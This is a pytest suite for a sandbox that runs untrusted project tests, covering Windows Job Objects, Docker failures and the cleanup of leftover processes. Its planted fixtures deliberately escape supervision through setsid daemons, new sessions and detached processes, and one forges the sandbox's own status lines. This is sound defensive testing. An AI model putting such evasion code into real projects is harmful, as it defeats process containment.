"""The test sandbox does not run a project's tests when it could not be set up, and leaves nothing they started.

Stage 7 of the 2026-11-09 directive ("check Windows sandbox setup ... if required isolation cannot be established,
do not run the untrusted code; safe static analysis can continue"). Each dangerous case here has a safe twin: the
same run with nothing wrong runs the tests (also `tests/test_sandbox.py`).

* `lantern.winjob`: every call of the Windows Job Object is checked. Tried on any system against a stand-in for
  kernel32; the real one is tried by the tests marked Windows, which only a Windows computer runs.
* A set-up that fails means `sandbox.Unavailable` and no test run: the job, Landlock, the guard in the tests' Python.
* Nothing a test started is left: after the tests end, at the wall clock, on a cancel, when the program leaves and
  when it is killed. Also a process that moved to another session, and a daemon.
* Deleting the sandbox's folder changes nothing outside it and says when it could not.
"""
import ctypes
import json
import os
import signal
import stat
import subprocess
import sys
import threading
import time
from pathlib import Path

import pytest
from test_sandbox import _alive

from lantern import _jail, programs, sandbox, winjob

ROOT = Path(sandbox.__file__).resolve().parent.parent
LINUX = sys.platform.startswith("linux")
WINDOWS = sys.platform == "win32"
only_windows = pytest.mark.skipif(not WINDOWS, reason="needs Windows (the real Job Object)")
only_posix = pytest.mark.skipif(os.name != "posix", reason="needs a POSIX system (the launcher lantern._jail)")
only_linux = pytest.mark.skipif(not LINUX, reason="needs Linux (the launcher's supervisor reads /proc)")
needs_landlock = pytest.mark.skipif(sandbox.landlock_abi() < 1, reason="needs a Linux kernel with Landlock")
# on Windows a process handed a job is made suspended, and only the real job can let it run: the tests marked
# Windows try the same things with the real one
stand_in_job = pytest.mark.skipif(WINDOWS, reason="a stand-in job cannot let a suspended Windows process run (the real job is tried there)")
needs_root = pytest.mark.skipif(not hasattr(os, "geteuid") or os.geteuid() != 0, reason="needs root (the tests then run as another user)")


# ---------------------------------------------------------------------------- a stand-in for kernel32
class Kernel32:
    """What `winjob` calls, answering as Windows does. `fail` names a call that fails (`code` is then what
    GetLastError says); `threads` are (thread, owner process, suspend count) rows of the snapshot."""

    def __init__(self, fail: str = "", code: int = 5, threads=((7001, 4242, 1), (7002, 9999, 0)), not_inside=False):
        self.fail, self.code, self.not_inside = fail, code, not_inside
        self.threads = [list(t) for t in threads]
        self.calls: list[str] = []
        self.open: set[int] = set()
        self.closed: list[int] = []
        self.resumed: list[int] = []
        self.in_job: set[int] = set()
        self.limits = None
        self.active = 2
        self._next, self._at, self._error = 100, 0, 0

    def last_error(self) -> int:
        return self._error

    def _handle(self) -> int:
        self._next += 1
        self.open.add(self._next)
        return self._next

    def _said(self, name: str, result):
        self.calls.append(name)
        self._error = self.code if name == self.fail else 0
        return 0 if name == self.fail else result

    def CreateJobObjectW(self, attributes, name):
        return self._said("CreateJobObjectW", self._handle() if self.fail != "CreateJobObjectW" else 0)

    def SetInformationJobObject(self, job, kind, info, size):
        self.limits = (kind, info._obj.Basic.LimitFlags, info._obj.ProcessMemoryLimit, size)
        return self._said("SetInformationJobObject", 1)

    def OpenProcess(self, rights, inherit, pid):
        self.rights = rights
        return self._said("OpenProcess", self._handle() if self.fail != "OpenProcess" else 0)

    def AssignProcessToJobObject(self, job, process):
        if self.fail != "AssignProcessToJobObject":
            self.in_job.add(process)
        return self._said("AssignProcessToJobObject", 1)

    def IsProcessInJob(self, process, job, answer):
        answer._obj.value = 1 if process in self.in_job and not self.not_inside else 0
        return self._said("IsProcessInJob", 1)

    def TerminateJobObject(self, job, code):
        self.active = 0
        return self._said("TerminateJobObject", 1)

    def QueryInformationJobObject(self, job, kind, info, size, got):
        info._obj.ActiveProcesses = self.active
        return self._said("QueryInformationJobObject", 1)

    def CreateToolhelp32Snapshot(self, flags, pid):
        if self.fail == "CreateToolhelp32Snapshot":
            self._said("CreateToolhelp32Snapshot", 0)
            return winjob.INVALID_HANDLE
        return self._said("CreateToolhelp32Snapshot", self._handle())

    def _thread(self, name, entry):
        if self._at >= len(self.threads):
            self.calls.append(name)
            self._error = self.code if self.fail == "Thread32Next" else winjob.NO_MORE_FILES
            return 0
        assert entry._obj.dwSize == ctypes.sizeof(winjob.ThreadEntry)
        entry._obj.th32ThreadID, entry._obj.th32OwnerProcessID = self.threads[self._at][:2]
        self._at += 1
        return self._said(name, 1)

    def Thread32First(self, snapshot, entry):
        self._at = 0
        return self._thread("Thread32First", entry)

    def Thread32Next(self, snapshot, entry):
        return self._thread("Thread32Next", entry)

    def OpenThread(self, rights, inherit, thread):
        self._thread_open = thread
        return self._said("OpenThread", self._handle() if self.fail != "OpenThread" else 0)

    def ResumeThread(self, handle):
        self.calls.append("ResumeThread")
        if self.fail == "ResumeThread":
            self._error = self.code
            return winjob.RESUME_FAILED
        row = next(t for t in self.threads if t[0] == self._thread_open)
        before, row[2] = row[2], max(0, row[2] - 1)
        self.resumed.append(row[0])
        self._error = 0
        return before

    def CloseHandle(self, handle):
        self.calls.append("CloseHandle")
        self.open.discard(handle)
        self.closed.append(handle)
        return 1


def test_windows_job_makes_every_call_in_order_and_gives_every_handle_back():
    k = Kernel32()
    job = winjob.Job(k32=k)
    assert k.limits == (winjob.EXTENDED_LIMIT, winjob.KILL_ON_JOB_CLOSE | winjob.PROCESS_MEMORY, 2 << 30,
                        ctypes.sizeof(winjob.ExtendedLimits))
    job.take(4242)
    assert job.release(4242) == 1 and k.resumed == [7001]      # the process's own thread, not another program's
    assert job.count() == 2
    job.stop()
    assert job.count() == 0
    job.close()
    job.close()                                                  # a second close gives nothing back twice
    assert k.calls == ["CreateJobObjectW", "SetInformationJobObject",
                       "OpenProcess", "AssignProcessToJobObject", "IsProcessInJob", "CloseHandle",
                       "CreateToolhelp32Snapshot", "Thread32First", "OpenThread", "ResumeThread", "CloseHandle",
                       "Thread32Next", "Thread32Next", "CloseHandle",
                       "QueryInformationJobObject", "TerminateJobObject", "QueryInformationJobObject", "CloseHandle"]
    assert k.open == set() and len(k.closed) == len(set(k.closed)) == 4   # process, thread, snapshot, job: once each
    assert k.rights == winjob.PROCESS_RIGHTS != 0x1F0FFF          # only what the calls need, not every right


@pytest.mark.parametrize("call", ["CreateJobObjectW", "SetInformationJobObject", "OpenProcess",
                                  "AssignProcessToJobObject", "IsProcessInJob", "CreateToolhelp32Snapshot",
                                  "Thread32First", "OpenThread", "ResumeThread", "Thread32Next",
                                  "TerminateJobObject", "QueryInformationJobObject"])
def test_windows_job_a_call_that_fails_is_named_with_its_number_and_no_handle_is_left(call):
    k = Kernel32(fail=call, code=1314)
    job = None
    with pytest.raises(winjob.JobError) as e:
        job = winjob.Job(k32=k)
        job.take(4242)
        job.release(4242)
        job.stop()
        job.count()
    assert e.value.call == call and e.value.code == 1314 and call in str(e.value) and "1314" in str(e.value)
    assert isinstance(e.value, OSError)
    if call in ("CreateJobObjectW", "SetInformationJobObject", "OpenProcess", "AssignProcessToJobObject",
                "IsProcessInJob", "CreateToolhelp32Snapshot", "Thread32First", "OpenThread"):
        assert k.resumed == []                                   # the process was never let run
    if job is not None:
        job.close()
    assert k.open == set(), "a handle was left open"


def test_windows_job_a_process_windows_says_is_not_in_the_job_is_not_let_run():
    k = Kernel32(not_inside=True)
    job = winjob.Job(k32=k)
    with pytest.raises(winjob.JobError) as e:
        job.take(4242)
    assert e.value.call == "IsProcessInJob" and e.value.code == 0 and "not in the job" in str(e.value)
    job.close()
    assert k.open == set() and k.resumed == []


def test_windows_job_a_process_with_no_thread_found_is_an_error_and_a_thread_suspended_twice_is_resumed_twice():
    k = Kernel32(threads=((7002, 9999, 0),))
    job = winjob.Job(k32=k)
    with pytest.raises(winjob.JobError) as e:
        job.release(4242)
    assert "no thread of process 4242" in str(e.value) and k.resumed == []
    job.close()
    k = Kernel32(threads=((7001, 4242, 2), (7003, 4242, 1)))
    job = winjob.Job(k32=k)
    assert job.release(4242) == 2 and k.resumed == [7001, 7001, 7003]
    job.close()
    assert k.open == set()


def test_windows_structures_have_the_sizes_windows_gives_them():
    wide = ctypes.sizeof(ctypes.c_void_p) == 8
    assert ctypes.sizeof(winjob.ExtendedLimits) == (144 if wide else 112)   # JOBOBJECT_EXTENDED_LIMIT_INFORMATION
    assert ctypes.sizeof(winjob.Accounting) == 48                           # JOBOBJECT_BASIC_ACCOUNTING_INFORMATION
    assert ctypes.sizeof(winjob.ThreadEntry) == 28                          # THREADENTRY32
    assert winjob.ExtendedLimits.ProcessMemoryLimit.offset == (112 if wide else 96)
    assert {name: kind for name, kind, _ in winjob._Kernel32.CALLS}["CreateJobObjectW"] is ctypes.c_void_p   # a whole handle


# ---------------------------------------------------------------------------- a job that cannot hold the process
class HeldBy:
    """What `sandbox._stream` is handed for a job: `refuse` names the step that fails."""

    def __init__(self, refuse: str = ""):
        self.refuse, self.did, self.pid = refuse, [], None

    def _step(self, name):
        self.did.append(name)
        if name == self.refuse:
            raise winjob.JobError({"take": "AssignProcessToJobObject", "release": "ResumeThread",
                                   "stop": "TerminateJobObject"}[name], 5)

    def take(self, pid):
        self.pid = pid
        self._step("take")

    def release(self, pid):
        self._step("release")

    def stop(self):
        self._step("stop")

    def count(self):
        return 0

    def close(self):
        self.did.append("close")


SLEEPER = [sys.executable, "-c", "import time; print('RAN', flush=True); time.sleep(60)"]


@stand_in_job
@pytest.mark.parametrize("step", ["take", "release"])
def test_a_job_that_cannot_hold_the_process_stops_it_and_says_the_tests_were_not_run(step, tmp_path):
    held, lines = HeldBy(step), []
    with pytest.raises(sandbox.Unavailable) as e:
        sandbox._stream(SLEEPER, tmp_path, dict(os.environ), 30, lines.append, job=lambda: held)
    assert ("AssignProcessToJobObject" if step == "take" else "ResumeThread") in str(e.value)
    assert "Windows error 5" in str(e.value) and "not started" in str(e.value)
    assert held.did[-2:] == ["stop", "close"], held.did          # the job was ended and its handle given back
    assert not _alive(held.pid), "the process was left running"
    assert not sandbox._LIVE


@stand_in_job
def test_a_job_that_holds_the_process_is_stopped_and_closed_once_when_the_command_ends(tmp_path):
    held, lines = HeldBy(), []
    rc, out, timed_out = sandbox._stream([sys.executable, "-c", "print('RAN')"], tmp_path, dict(os.environ), 30,
                                         lines.append, job=lambda: held)
    assert (rc, timed_out) == (0, False) and "RAN" in out          # the safe twin: a job that works runs the command
    assert held.did == ["take", "release", "stop", "close"]


@stand_in_job
def test_a_job_windows_will_not_end_is_said_in_the_log(tmp_path):
    held, lines = HeldBy("stop"), []
    rc, _out, timed_out = sandbox._stream(SLEEPER, tmp_path, dict(os.environ), 1, lines.append, job=lambda: held)
    assert rc is None and timed_out
    assert any("Windows did not end the processes of this run" in x and "TerminateJobObject" in x for x in lines), lines
    assert held.did[-1] == "close"


def test_no_job_is_made_where_the_launcher_does_that_work():
    if WINDOWS:
        job = sandbox._windows_job()
        try:
            assert isinstance(job, winjob.Job) and job.count() == 0
        finally:
            job.close()
    else:
        assert sandbox._windows_job() is None


# ---------------------------------------------------------------------------- projects with planted tests
def _project(tmp_path, body: str, name: str = "planted") -> Path:
    repo = tmp_path / name
    (repo / "tests").mkdir(parents=True)
    (repo / "pyproject.toml").write_text(f"[project]\nname = '{name}'\n", encoding="utf-8")
    (repo / "tests" / "test_it.py").write_text(body, encoding="utf-8")
    return repo


QUIET = "def test_ran():\n    print('PLANTED-RAN', flush=True)\n"

# three ways a test leaves a process behind: a plain child; one that moves to its own session (and so leaves the
# process group); a daemon whose parent ends at once. Windows: a plain child and a detached one.
STARTS = '''
import os, subprocess, sys, time
SLEEP = [sys.executable, "-c", "import time; time.sleep(300)"]

def start():
    kids = [subprocess.Popen(SLEEP).pid]
    if os.name == "posix":
        kids.append(subprocess.Popen(SLEEP, start_new_session=True).pid)
        r, w = os.pipe()
        mid = os.fork()
        if mid == 0:
            os.close(r)
            if os.fork() == 0:
                os.setsid()
                os.write(w, str(os.getpid()).encode())
                os.close(w)
                os.execv(sys.executable, SLEEP)
            os._exit(0)
        os.close(w)
        os.waitpid(mid, 0)
        kids.append(int(os.read(r, 32)))
        os.close(r)
    else:
        kids.append(subprocess.Popen(SLEEP, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP).pid)
    print("STARTED", *kids, flush=True)
'''
PYTEST = ["python", "-m", "pytest", "-q", "-s", "-p", "no:randomly"]


def _started(lines) -> list[int]:
    for line in list(lines):
        if line.startswith("STARTED"):
            return [int(x) for x in line.split()[1:]]
    return []


def _must_end(pids: list[int]) -> list[int]:
    """The processes that have to be gone. Linux and Windows: all of them. Another POSIX system has no supervisor
    and ends the process group only: the plain child."""
    return pids if LINUX or WINDOWS else pids[:1]


def _still_there(pids: list[int], seconds: float = 5.0) -> list[int]:
    end = time.monotonic() + seconds
    while True:
        left = [p for p in pids if _alive(p)]
        if not left or time.monotonic() > end:
            return left
        time.sleep(0.05)


@pytest.fixture()
def sweep():
    """Whatever a test of this file leaves behind is ended when it is over, so a failure here leaves nothing."""
    pids: list[int] = []
    yield pids
    for pid in pids:
        if _alive(pid):
            if WINDOWS:
                subprocess.run(["taskkill", "/F", "/PID", str(pid)], capture_output=True)
            else:
                try:
                    os.kill(pid, signal.SIGKILL)
                except OSError:
                    pass


def test_nothing_a_test_started_is_left_when_the_tests_end(tmp_path, sweep):
    repo = _project(tmp_path, STARTS + "\ndef test_leaves_them():\n    start()\n")
    lines = []
    r = sandbox.run(repo, PYTEST, log=lines.append, backend="subprocess", timeout=120)
    pids = _started(lines)
    sweep.extend(pids)
    assert r["returncode"] == 0 and len(pids) >= 2, r["output_tail"]
    assert not r["timed_out"] and not r["cancelled"]
    assert _still_there(_must_end(pids)) == [], "a process the tests started outlived them"


def test_nothing_a_test_started_is_left_at_the_wall_clock(tmp_path, sweep):
    repo = _project(tmp_path, STARTS + "\ndef test_never_ends():\n    start()\n    time.sleep(300)\n")
    lines = []
    r = sandbox.run(repo, PYTEST, log=lines.append, backend="subprocess", timeout=8)
    pids = _started(lines)
    sweep.extend(pids)
    assert r["timed_out"] and r["returncode"] is None and not r["cancelled"] and len(pids) >= 2, r["output_tail"]
    assert _still_there(_must_end(pids)) == [], "a process the tests started outlived the wall clock"
    assert any("every process it started was ended" in x for x in lines)
    assert not any("could not be ended" in x for x in lines), lines


def test_a_cancel_stops_the_tests_at_once_and_leaves_nothing(tmp_path, sweep):
    repo = _project(tmp_path, STARTS + "\ndef test_never_ends():\n    start()\n    time.sleep(300)\n")
    lines, cancel = [], threading.Event()

    def log(line):
        lines.append(line)
        if line.startswith("STARTED"):
            cancel.set()
    t = time.monotonic()
    r = sandbox.run(repo, PYTEST, log=log, backend="subprocess", timeout=120, cancel=cancel)
    took = time.monotonic() - t
    pids = _started(lines)
    sweep.extend(pids)
    assert r["cancelled"] and not r["timed_out"] and r["returncode"] is None and len(pids) >= 2, r["output_tail"]
    assert took < 60, f"the cancel waited {took:.0f} s"
    assert _still_there(_must_end(pids)) == [], "a process the tests started outlived the cancel"
    assert any("stopped because it was asked to" in x for x in lines)


def test_a_cancel_that_is_never_set_changes_nothing(tmp_path):
    repo = _project(tmp_path, QUIET)
    lines = []
    r = sandbox.run(repo, PYTEST, log=lines.append, backend="subprocess", timeout=120, cancel=threading.Event())
    assert r["returncode"] == 0 and not r["cancelled"] and not r["timed_out"] and "PLANTED-RAN" in r["output_tail"]


def test_the_sheet_promises_what_this_system_keeps_and_says_that_tests_do_not_run_without_it(tmp_path, monkeypatch):
    """What the person reads before confirming. "Everything it started is stopped" is promised where something
    ends it all (the launcher on Linux, the job on Windows, the container with Docker), and not on another system,
    where a program that left the tests' group is not found again."""
    monkeypatch.setenv("LANTERN_SANDBOX", "subprocess")
    last = "if any of this cannot be set up, your tests are not run"
    d = sandbox.describe(tmp_path, "python")["details"]
    assert d[-1] == last and len(d) == len(set(d))
    all_of_it = "10 minutes, then everything it started is stopped"
    assert (all_of_it in d) == (LINUX or WINDOWS)
    monkeypatch.setattr(sandbox, "_LINUX", False)
    monkeypatch.setattr(sys, "platform", "darwin")
    d = sandbox.describe(tmp_path, "python")["details"]
    assert d[-1] == last and all_of_it not in d
    assert "10 minutes, then the tests are stopped (a program they moved out of their group is not found again)" in d
    monkeypatch.undo()
    monkeypatch.setenv("LANTERN_SANDBOX", "docker")
    d = sandbox.describe(tmp_path, "python")
    assert d["name"] == "docker" and d["details"][-1] == last


# ---------------------------------------------------------------------------- what could not be ended is said
def test_what_a_stop_could_not_do_is_handed_back_and_the_safe_twin_hands_back_nothing(tmp_path):
    for also, want in ((lambda: "its container may still be running", ["its container may still be running"]),
                       (lambda: None, [])):
        left, lines = [], []
        rc, _out, timed_out = sandbox._stream(SLEEPER, tmp_path, dict(os.environ), 1, lines.append, also=also, left=left)
        assert rc is None and timed_out
        assert left == want, (left, lines)
        assert [x for x in lines if x.startswith("sandbox: ")] == ["sandbox: " + x for x in want], lines


def test_a_clean_up_that_raises_is_said_in_lanterns_own_words(tmp_path):
    def also():
        raise OSError("words that may be anything")
    left, lines = [], []
    rc, _out, timed_out = sandbox._stream(SLEEPER, tmp_path, dict(os.environ), 1, lines.append, also=also, left=left)
    assert rc is None and timed_out
    assert left == ["the clean-up after stopping it failed (OSError)"], left


@only_linux
def test_a_stopped_run_says_that_everything_was_ended_only_when_it_was(tmp_path, monkeypatch):
    """Until 2026-11-10 the log of a run stopped at the wall clock ended with "every process it started was ended"
    whatever had happened (measured on that code with two of three processes still running). Here the look for
    what is left keeps finding one process, as it would for one that cannot be ended."""
    monkeypatch.setattr(sandbox, "_KILL_WAIT", 0.3)
    monkeypatch.setattr(_jail, "in_session", lambda sid: [4242])
    monkeypatch.setattr(_jail, "end_session", lambda sid: None)
    repo = _project(tmp_path, "import time\n\ndef test_never_ends():\n    time.sleep(300)\n")
    lines = []
    r = sandbox.run(repo, PYTEST, log=lines.append, backend="subprocess", timeout=6)
    assert r["timed_out"] and r["returncode"] is None
    assert r["not_ended"] == ["1 process(es) this run started could not be ended"], r["not_ended"]
    assert not any("every process it started was ended" in x for x in lines), lines
    assert any("stopped after 6 s (the wall clock); not everything it started could be ended" in x for x in lines), lines


@only_posix
def test_what_the_launcher_could_not_end_reaches_the_result_as_a_number_in_lanterns_words(tmp_path):
    """The launcher is another program and has one way to tell Lantern: a line of the run's output. A test can
    print that line too, and then says of itself that it left something: the words shown are Lantern's and the
    number is read as a number. The safe twin: a run that prints nothing of the kind has nothing to say."""
    said = "sandbox: 3 process(es) the command started could not be ended"
    repo = _project(tmp_path, f"def test_says_it():\n    print({said!r}, flush=True)\n")
    r = sandbox.run(repo, PYTEST, log=lambda line: None, backend="subprocess", timeout=120)
    assert r["returncode"] == 0 and r["not_ended"] == ["3 process(es) the tests started could not be ended by their launcher"]
    for other in ("sandbox: 3 process(es) the command started could not be ended <b>x</b>",
                  "sandbox: many process(es) the command started could not be ended", "PLANTED-RAN"):
        repo = _project(tmp_path, f"def test_says_it():\n    print({other!r}, flush=True)\n", name="twin")
        r = sandbox.run(repo, PYTEST, log=lambda line: None, backend="subprocess", timeout=120)
        assert r["returncode"] == 0 and r["not_ended"] == [], (other, r["not_ended"])
        sandbox._rm(repo)


FAKE_DOCKER = '''#!/bin/sh
# a stand-in for the docker program: "run" does what the file run.mode says, "rm" what rm.mode says
here=$(dirname "$0")
case "$1" in
  run) case "$(cat "$here/run.mode")" in
         stays) echo FAKE-CONTAINER-RUNNING; exec sleep 300 ;;
         *) echo "docker: Error response from daemon: no such image." >&2; echo "See 'docker run --help'." >&2; exit 125 ;;
       esac ;;
  rm) echo "$@" >> "$here/rm.log"
      case "$(cat "$here/rm.mode")" in
        ok) echo "$3"; exit 0 ;;
        gone) echo "Error response from daemon: No such container: $3" >&2; exit 1 ;;
        *) echo "Error response from daemon: cannot remove container: permission denied" >&2; exit 1 ;;
      esac ;;
esac
exit 0
'''


def _fake_docker(tmp_path, monkeypatch, run: str, rm: str) -> Path:
    where = tmp_path / "bin"
    where.mkdir()
    (where / "docker").write_text(FAKE_DOCKER, encoding="utf-8")
    (where / "docker").chmod(0o755)
    (where / "run.mode").write_text(run, encoding="utf-8")
    (where / "rm.mode").write_text(rm, encoding="utf-8")
    monkeypatch.setenv("PATH", str(where) + os.pathsep + os.environ["PATH"])
    return where


@only_posix
@pytest.mark.parametrize("answer, removed", [("ok", True), ("gone", True), ("refused", False)])
def test_a_container_that_could_not_be_removed_is_said_and_not_called_removed(answer, removed, tmp_path, monkeypatch):
    """Until 2026-11-10 the result of `docker rm -f` was not looked at, and the log said "the container was
    removed" either way. (A stand-in for the docker program: the real one is tried by tests/test_sandbox.py.)"""
    where = _fake_docker(tmp_path, monkeypatch, "stays", answer)
    repo = _project(tmp_path, QUIET)
    lines = []
    r = sandbox.run(repo, PYTEST, log=lines.append, backend="docker", timeout=2)
    assert r["timed_out"] and r["returncode"] is None and "FAKE-CONTAINER-RUNNING" in r["output_tail"]
    asked = (where / "rm.log").read_text(encoding="utf-8")
    assert asked.startswith("rm -f lantern-sbx-"), asked           # this run's own container, by its name
    if removed:
        assert r["not_ended"] == [] and any("the container was removed" in x for x in lines), lines
    else:
        assert len(r["not_ended"]) == 1 and asked.split()[2] in r["not_ended"][0] and "docker rm ended with 1" in r["not_ended"][0]
        assert not any("the container was removed" in x for x in lines), lines
        assert any("not everything it started could be ended" in x for x in lines), lines


@only_posix
def test_a_container_docker_could_not_start_means_the_tests_were_not_run(tmp_path, monkeypatch):
    """`docker run` ends with 125 when Docker itself failed (no such image, a daemon that went away): no test has
    run. Until 2026-11-10 that was reported as tests that failed with exit code 125."""
    _fake_docker(tmp_path, monkeypatch, "fails", "ok")
    repo = _project(tmp_path, QUIET)
    with pytest.raises(sandbox.Unavailable) as e:
        sandbox.run(repo, PYTEST, log=lambda line: None, backend="docker", timeout=30)
    assert "Docker could not start the container" in str(e.value) and "no such image" not in str(e.value)


@only_posix
def test_tests_that_end_with_125_by_themselves_are_tests_that_ran(tmp_path, monkeypatch):
    where = _fake_docker(tmp_path, monkeypatch, "stays", "ok")
    (where / "docker").write_text("#!/bin/sh\necho 'PLANTED-RAN and ended with 125'\nexit 125\n", encoding="utf-8")
    r = sandbox.run(_project(tmp_path, QUIET), PYTEST, log=lambda line: None, backend="docker", timeout=30)
    assert r["returncode"] == 125 and not r["timed_out"] and not r["cancelled"]


RUNNER = '''
import os, sys, threading, time
from pathlib import Path
from lantern import sandbox
repo, how = Path(sys.argv[1]), sys.argv[2]
seen = threading.Event()
def log(line):
    print(line, flush=True)
    if line.startswith("STARTED"):
        seen.set()
    if how == "leave" and line.startswith("sandbox: stopped"):
        time.sleep(1.0)                 # a log that takes its time (a window to draw, a slow terminal)
def go():
    sandbox.run(repo, ["python", "-m", "pytest", "-q", "-s", "-p", "no:randomly"], log=log, backend="subprocess", timeout=120)
print("RUNNER", os.getpid(), flush=True)
if how == "leave":                      # the program ends while a run is going (the app is closed)
    threading.Thread(target=go, daemon=True).start()
    seen.wait(90)
    sys.exit(0)
go()                                    # "killed": the test ends this program from outside, with no warning
'''


def _runner(repo: Path, how: str, temp: Path | None = None):
    env = dict(os.environ)
    if temp is not None:                # where this program's sandbox makes its temp folder
        env.update(TMPDIR=str(temp), TEMP=str(temp), TMP=str(temp))
    return subprocess.Popen([sys.executable, "-c", RUNNER, str(repo), how], cwd=ROOT, env=env, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True, encoding="utf-8", errors="replace")


def _read_until_started(p) -> tuple[list[int], int, list[str]]:
    lines, runner = [], 0
    for line in p.stdout:
        line = line.rstrip("\n")
        lines.append(line)
        if line.startswith("RUNNER"):
            runner = int(line.split()[1])
        if line.startswith("STARTED"):
            break
    return _started(lines), runner, lines


@pytest.fixture()
def own_temp(tmp_path):
    """A temp folder of this test's own, for the sandbox to make its folder in. As root the tests of a run are
    another user, who cannot enter pytest's folder (the sandbox then refuses to run them): there it is made in
    the system's temp folder, open to that user, and removed by its own name when the test is over."""
    import shutil
    import tempfile
    if hasattr(os, "geteuid") and os.geteuid() == 0:
        temp = Path(tempfile.mkdtemp(prefix="lantern-test-temp-"))
        temp.chmod(0o1777)
    else:
        temp = tmp_path / "temp"
        temp.mkdir()
    yield temp
    shutil.rmtree(temp, ignore_errors=True)


def _copies_left(temp: Path, said) -> list[str]:
    '''The sandbox temp folders (each a copy of a project) still in `temp`. None may stay without a word: on
    Windows a folder can refuse to go for a moment after the processes that used it were ended, and the run then
    says so in its log, which is all this asks of it there.'''
    left = sorted(p.name for p in temp.iterdir() if p.name.startswith("lantern-sandbox-"))
    if WINDOWS and left and any("its temp folder could not be deleted and is still there" in x for x in said):
        return []
    return left


def test_nothing_is_left_when_the_program_leaves_while_the_tests_run(tmp_path, sweep, own_temp):
    '''The app is closed while a project's tests run. Until 2026-11-10 (the second fix of that day) the program
    waited until the tests' processes were ended and then left, while the run's own thread had not finished: the
    copy of the project stayed in the temp folder (20 of 20 tries), nothing said so, and a thread cut off in the
    middle of its last log line took the whole program down as it left ("Fatal Python error ... at interpreter
    shutdown", twice on CI).'''
    repo = _project(tmp_path, STARTS + "\ndef test_never_ends():\n    start()\n    time.sleep(300)\n")
    temp = own_temp
    p = _runner(repo, "leave", temp)
    pids, _runner_pid, lines = _read_until_started(p)
    sweep.extend(pids)
    rest = p.communicate(timeout=120)[0]
    assert len(pids) >= 2, lines + rest.splitlines()
    assert p.returncode == 0, rest
    assert _still_there(_must_end(pids)) == [], "a process the tests started outlived the program that ran them"
    assert any(x.startswith("sandbox: stopped because it was asked to") for x in rest.splitlines()), rest
    assert _copies_left(temp, rest.splitlines()) == [], "the program left before the copy of the project was deleted:\n" + rest


def test_stopping_everything_comes_back_only_when_each_run_has_tidied_up(tmp_path, monkeypatch, sweep, own_temp):
    '''`stop_all` is what the app calls as it closes. When it comes back, the run's temp folder is gone and its
    last line is logged, however long the log takes over that line.'''
    import tempfile
    repo = _project(tmp_path, STARTS + "\ndef test_never_ends():\n    start()\n    time.sleep(300)\n")
    temp = own_temp
    monkeypatch.setattr(tempfile, "tempdir", str(temp))
    lines, out, started = [], {}, threading.Event()

    def log(line):
        lines.append(line)
        if line.startswith("STARTED"):
            started.set()
        if line.startswith("sandbox: stopped"):
            time.sleep(1.0)

    t = threading.Thread(target=lambda: out.update(r=sandbox.run(repo, PYTEST, log=log, backend="subprocess", timeout=120)))
    t.start()
    try:
        assert started.wait(90), lines
        sweep.extend(_started(lines))
        assert sandbox.stop_all() == 1
        assert _copies_left(temp, lines) == [], "stop_all came back before the run had deleted its temp folder"
        assert any(x.startswith("sandbox: stopped because it was asked to") for x in lines), lines
    finally:
        sandbox.stop_all()
        t.join(60)
    assert not t.is_alive() and out["r"]["cancelled"] and out["r"]["returncode"] is None, out
    assert _still_there(_must_end(_started(lines))) == []


def test_a_run_that_is_still_copying_the_project_when_all_is_stopped_starts_no_test(tmp_path, monkeypatch, own_temp):
    '''The app is closed while the project is still being copied into the sandbox: no command is running yet.
    Until 2026-11-10 `stop_all` saw nothing to stop and came back at once; the run then started the tests, and
    the program left under them.'''
    import tempfile
    repo = _project(tmp_path, QUIET)
    temp = own_temp
    monkeypatch.setattr(tempfile, "tempdir", str(temp))
    copying, go_on, real = threading.Event(), threading.Event(), sandbox._copy

    def slow_copy(src, dst):
        real(src, dst)
        copying.set()
        go_on.wait(60)

    monkeypatch.setattr(sandbox, "_copy", slow_copy)
    lines, out = [], {}
    t = threading.Thread(target=lambda: out.update(r=sandbox.run(repo, PYTEST, log=lines.append, backend="subprocess", timeout=120)))
    t.start()
    stopper = threading.Thread(target=sandbox.stop_all)
    try:
        assert copying.wait(60), lines
        stopper.start()
        stopper.join(1.0)
        assert stopper.is_alive(), "stop_all came back while a run had not tidied up"
    finally:
        go_on.set()
        if stopper.ident is not None:
            stopper.join(60)
        t.join(120)
    assert not stopper.is_alive() and not t.is_alive()
    assert out["r"]["cancelled"] and out["r"]["returncode"] is None and not out["r"]["timed_out"], out
    assert not any("PLANTED-RAN" in x or "passed" in x for x in lines), lines          # no test was started
    assert any(x.startswith("sandbox: stopped because it was asked to") for x in lines), lines
    assert _copies_left(temp, lines) == []


def test_a_run_asked_to_stop_before_it_began_starts_nothing_and_a_run_not_asked_runs(tmp_path, monkeypatch):
    """Until 2026-11-10 the command was started and then stopped: the tests could have run their first lines."""
    made, real = [], subprocess.Popen

    def popen(*args, **kw):
        made.append(args)
        return real(*args, **kw)

    monkeypatch.setattr(subprocess, "Popen", popen)
    cancel = threading.Event()
    cancel.set()
    lines = []
    r = sandbox.run(_project(tmp_path, QUIET), PYTEST, log=lines.append, backend="subprocess", timeout=120, cancel=cancel)
    assert r["cancelled"] and r["returncode"] is None and r["not_ended"] == [], r
    assert made == [] and not any("PLANTED-RAN" in x for x in lines), (made, lines)
    lines = []                           # the safe twin: the same run, nobody asking
    r = sandbox.run(_project(tmp_path, QUIET, "twin"), PYTEST, log=lines.append, backend="subprocess", timeout=120,
                    cancel=threading.Event())
    assert r["returncode"] == 0 and not r["cancelled"] and any("PLANTED-RAN" in x for x in lines), lines
    assert len(made) == 1 and sandbox.stop_all() == 0       # one command was made, and nothing is going afterwards
    assert not sandbox._GOING and not sandbox._LIVE


@pytest.mark.skipif(not (LINUX or WINDOWS), reason="needs Linux (the supervisor is told when its parent ends) or Windows (the job ends with its last handle)")
def test_nothing_is_left_when_the_program_is_killed_while_the_tests_run(tmp_path, sweep):
    repo = _project(tmp_path, STARTS + "\ndef test_never_ends():\n    start()\n    time.sleep(300)\n")
    p = _runner(repo, "killed")
    pids, runner, lines = _read_until_started(p)
    sweep.extend(pids)
    assert len(pids) >= 2 and runner, lines
    if WINDOWS:   # by its own number: in a virtual environment `p` is only the launcher of the real interpreter
        subprocess.run(["taskkill", "/F", "/PID", str(runner)], capture_output=True)
    else:
        os.kill(runner, signal.SIGKILL)
    p.communicate(timeout=60)
    assert _still_there(pids, 10) == [], "a process the tests started outlived the program that ran them"


# ---------------------------------------------------------------------------- a set-up that fails: no test runs
